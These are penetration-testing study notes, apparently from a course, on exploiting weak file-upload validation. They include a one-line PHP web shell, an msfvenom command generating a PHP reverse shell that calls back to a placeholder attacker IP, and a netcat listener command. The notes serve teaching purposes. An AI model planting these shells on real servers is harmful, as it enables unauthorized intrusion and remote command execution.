# Basic Exploitation

## Introduction

The most common reason - weak file validation and verification, writing insecure functions, usage of outdated libraries.

Worst possible vulnerability is unauthenticated arbitrary file upload - allows any unauthenticated user to upload any file type.

Sometimes we may not have arbitrary file uploads and may only be able to upload a specific file type. This can also pose a number of vulnerabilities:
- XXE
- XSS
- DoS
- Overwriting critical system files and configurations, etc.

## Absent Validation

When there is not any validation at all we can upload directly our web shell or reverse shell script.

A web shell has to be written in the same programming language that runs the web server.

So the first step would be to **identify** what language runs the web app.

Often this can be seen by the *extensions* in the URLs, *fuzzing* the page, or using extensions like *Wappalyzer*.

## Upload Exploitation

**Web Shells**
There are a lot of web shells online that offer a lot of useful features.

For example `phpbash` or `SecLists` that offer a lot of these shells for different framewors.

But also simple web shells can be ritten without any big problem. For example on PHP apps, we can use hte `system()` function to execute system commands, and then pass it to the `cmd` parameter with `$_REQUEST['cmd']:

```sh
<?php system($_REQUEST['cmd']); >
```

**Reverse Shell**
The basic idea is that we upload a file on the target, which tries to connect to our machine, where we have activated a listener to wait for that connection.

After the connection has been established, then we can execute commands as we want.

We can **generate** our reverse shells using `msfvenom` tool.

```sh
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

Then start a listener:

```sh
nc -lvnp PORT
```

